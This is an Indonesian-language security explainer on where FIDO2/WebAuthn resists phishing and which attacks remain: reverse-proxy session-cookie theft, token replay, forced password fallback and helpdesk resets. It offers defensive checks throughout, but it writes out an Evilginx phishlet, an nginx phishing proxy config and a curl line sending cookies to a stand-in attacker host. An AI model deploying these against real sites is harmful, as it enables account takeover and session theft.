# mail-security--p4 — misc

# MFA Phishing-Resistant: FIDO/WebAuthn vs Kelas Serangan Residual

## 1. Mekanisme Resistensi FIDO2/WebAuthn

| Properti | Implementasi | Efek terhadap phishing |
|---|---|---|
| Origin binding | `clientDataJSON.origin` di-sign oleh authenticator | Credential hanya valid untuk RP ID + origin yang terdaftar |
| RP ID scoping | `rpId` harus suffix-match origin (`login.corp.example` → `corp.example`) | Tidak bisa dipakai di `corp-example.evil` |
| Challenge freshness | 16–64 byte random per assertion, server-issued | Replay assertion lama → ditolak |
| User presence | `UP` flag wajib (touch/PIN) | Tidak bisa silent-auth tanpa interaksi |
| User verification | `UV` flag (biometrik/PIN) opsional tapi policy-enforced | Menutup shared-device abuse bila `UV=required` |
| Attestation (opsional) | `attStmt` chain ke FIDO MDS | Deteksi authenticator palsu/emulator |
| Counter monotonicity | `signCount` per credential | Deteksi cloning (kecuali authenticator sync passkey) |

CTAP2 `getAssertion` menandatangani `SHA-256(authenticatorData || SHA-256(clientDataJSON))`. `clientDataJSON` memuat `challenge`, `origin`, `type`. Server wajib verifikasi ketiganya — kegagalan verifikasi origin adalah sumber bypass paling umum di implementasi custom.

Verifikasi minimum server-side (pseudo):

```python
assert client_data["type"] == "webauthn.get"
assert client_data["challenge"] == expected_challenge  # single-use, TTL ≤ 60s
assert client_data["origin"] in ALLOWED_ORIGINS       # exact match, bukan startswith
assert rp_id_hash == sha256(rp_id)
assert flags & 0x01  # UP
if policy_uv: assert flags & 0x04
if stored_sign_count > 0 and new_sign_count <= stored_sign_count: raise ClonedCredential
verify_signature(pubkey, signed_data, sig)
```

Versi acuan: Chrome 131 (WebAuthn L3, passkey hybrid via caBLE), Firefox 133, Safari 18.1 (iCloud Keychain passkey sync), Windows 11 24H2 (Windows Hello + FIDO2 security keys via `webauthn.dll` v4), YubiKey 5.7 firmware (FIDO 2.1, PIV 5.7), libfido2 1.15, python-fido2 1.2.

## 2. Kelas Serangan yang Masih Efektif

FIDO mematikan phishing klasik (credential relay ke domain penyerang gagal karena origin mismatch saat verifikasi). Yang **tidak** dimatikan: semua yang beroperasi di atas kanal post-auth atau yang memanipulasi sesi setelah assertion valid.

### 2.1 Adversary-in-the-Middle (AitM) / Reverse Proxy Phishing

| Aspek | Detail |
|---|---|
| Vektor | Evilginx 3.x, Modlishka, Muraena, atau custom (nginx 1.25 `proxy_pass` + `sub_filter`) |
| Yang dikirim | Korban → proxy (domain `login-corp[.]evil`), proxy → `login.corp.example` asli |
| Yang muncul | Halaman login asli (proxy relay), assertion WebAuthn **tidak** bisa di-relay (origin mismatch) |
| Kenapa berhasil | Bukan mencuri assertion — mencuri **session cookie / token** yang diterbitkan setelah auth sah |
| Syarat | RP tidak memverifikasi origin ketat ATAU attacker menargetkan flow fallback (password+TOTP) |

Kunci: AitM **tidak** mem-bypass WebAuthn. Ia bypass **lapisan setelah** WebAuthn dengan membuat korban melakukan auth sah lewat proxy, lalu proxy merebut cookie sesi hasilnya. Bila RP mengizinkan fallback ke password+OTP untuk akun yang punya FIDO terdaftar, AitM mengeksploitasi fallback tersebut.

Evilginx phishlet minimal (konsep):

```yaml
- phishlet: corp-portal
  proxy_hosts:
    - {phish_sub: login, orig_sub: login, domain: corp.example, session: true}
  auth_tokens:
    - {domain: corp.example, keys: ['__Host-SESSION', 'csrf_token']}
  credentials:
    username: {key: 'username'}
    password: {key: 'password'}
```

Konfigurasi nginx 1.25 reverse-proxy phishing (contoh konsep, bukan produksi):

```nginx
location / {
  proxy_pass https://login.corp.example;
  proxy_set_header Host login.corp.example;
  proxy_ssl_server_name on;
  proxy_cookie_domain login.corp.example login-corp.evil;
  sub_filter 'login.corp.example' 'login-corp.evil';
  sub_filter_once off;
}
```

### 2.2 Token Theft / Session Hijack

| Target | Lokasi | Mitigasi |
|---|---|---|
| Session cookie | `Set-Cookie` tanpa `__Host-` prefix | `__Host-` prefix + `Secure` + `SameSite=Strict` + `HttpOnly` |
| OAuth access/refresh token | localStorage, URL fragment, response body | DPoP (RFC 9449), token binding |
| SAML assertion | POST body, `RelayState` | Audience + `InResponseTo` + signed assertion, short TTL |
| JWT bearer | `Authorization: Bearer` | `cnf` claim + DPoP proof |

Bila cookie tidak `HttpOnly`, XSS→exfil. Bila `__Host-` prefix tidak dipakai, subdomain takeover bisa set cookie parent-domain.

Exfil contoh (red-team lab):

```bash
# dari XSS di app.corp.example, cookie __Host-SESSION tidak terbaca —
# tapi bila cookie bernama "SESSION" di domain .corp.example:
curl -s "https://attacker.tld/c?d=$(document.cookie | base64 -w0)"
```

DPoP proof yang harus diverifikasi RP (RFC 9449 §4.3): `htm`, `htu`, `iat` (≤ 300s skew), `jti` single-use, `ath` = `SHA-256(access_token)`. Tanpa ini, token curian replayable.

### 2.3 Real-Time Phishing (Evilginx + WebAuthn Fallback Manipulation)

| Langkah | Aksi attacker |
|---|---|
| 1 | Proxy `/webauthn/options` → RP asli, dapat `challenge` |
| 2 | Proxy menolak `navigator.credentials.get` (inject JS: delete `window.PublicKeyCredential`) |
| 3 | Korban fallback ke password + email OTP |
| 4 | Proxy relay OTP realtime, dapat session cookie |
| 5 | Cookie di-replay dari IP attacker |

Deteksi: RP wajib mengirim header `Permissions-Policy: publickey-credentials-get=(self)` dan memantau mismatch antara "user punya credential" vs "assertion diterima". Log WebAuthn `auth_method=password` untuk akun yang `has_fido2=true` → alert.

### 2.4 MFA Fatigue / Push Bombing (di luar FIDO murni)

FIDO tidak terpengaruh (butuh touch lokal + origin). Tetap dicatat karena RBAC helpdesk bisa jadi jalur reset: attacker sosial-engineering helpdesk untuk **menghapus** FIDO key, lalu enroll credential baru. Prosedur reset helpdesk adalah titik lemah operasional.

## 3. Matriks Resistensi

| Serangan | FIDO2 (verify ketat) | FIDO2 (implementasi longgar) | Password+TOTP |
|---|---|---|---|
| Credential phishing | Gagal | Gagal (jika origin dicek) | Berhasil |
| AitM cookie theft | Berhasil (cookie) | Berhasil | Berhasil |
| Replay assertion | Gagal (challenge) | **Berhasil** (challenge reusable) | — |
| Token replay | Tergantung DPoP | Berhasil | Berhasil |
| Cloning (sync passkey) | Tidak terdeteksi (signCount=0) | — | — |
| Real-time fallback phish | Berhasil (cookie) | Berhasil | Berhasil |

## 4. Jebakan Operasional di Lapangan

- **`origin` dicek dengan `startswith`** bukan exact-match → `https://login.corp.example.evil` lolos. Ini bug implementasi paling sering pada RP custom.
- **Challenge reusable / TTL panjang** (mis. disimpan di Redis tanpa `DEL` atomik) → assertion replay dalam window. Gunakan `SET challenge NX EX 60` lalu `DEL` di verifikasi.
- **`rpId` terlalu lebar** (`corp.example` untuk semua subdomain) → subdomain takeover = full credential scope.
- **Passkey sinkron (iCloud Keychain, Google Password Manager)** melaporkan `signCount=0`; deteksi cloning non-fungsional. Jangan andalkan counter.
- **`UV=preferred` global** → korban bisa auth dengan UP saja; enforce `UV=required` untuk akun privileged, tapi siap dengan fallback support tiket.
- **Fallback password tetap aktif** untuk akun ber-FIDO → AitM via fallback tetap jalan. Wajib disable atau gating ketat (FIDO-first, fallback terpisah + notifikasi).
- **Cookie tanpa `__Host-`** + `SameSite=Lax` → cross-site top-level navigasi membawa cookie; AitM tinggal redirect.
- **`Trusted Types` / CSP longgar** pada halaman login → skrip injeksi hapus `window.PublicKeyCredential` untuk memaksa fallback.
- **Helpdesk reset tanpa verifikasi identitas kuat** → seluruh rantai FIDO bisa di-reset via sosial engineering; ini jalur paling murah di red team engagement.
- **Load balancer multi-node tanpa sticky challenge store** → assertion diterima node A, diverifikasi node B → error atau (lebih buruk) challenge dianggap "tidak ada" dan verifikasi dilewati pada beberapa implementasi.
- **Attestation `none` tanpa MDS** → authenticator emulator (mis. `fido2` software pakai virtual authenticator Chrome DevTools) bisa didaftarkan bila Enrollment punya akses browser; untuk admin enrollment wajib attestation + AAGUID allowlist.
- **Time skew** antara authenticator dan RP > `iat` window DPoP (default 300s) → token sah ditolak, tim support mematikan DPoP cek untuk "stabilisasi" — regresi ke token replay.
- **Subdomain `www` vs apex** dengan RP ID beda → passkey terdaftar di apex tidak tampil di `www`; user bingung, helpdesk buat key baru, scope kredensial membengkak.
- **`__Host-` cookie di belakang TLS termination** tanpa `X-Forwarded-Proto` handling di nginx 1.25 → `Secure` flag tidak ter-set, cookie jatuh ke plain.

---

## [reasoning trace]


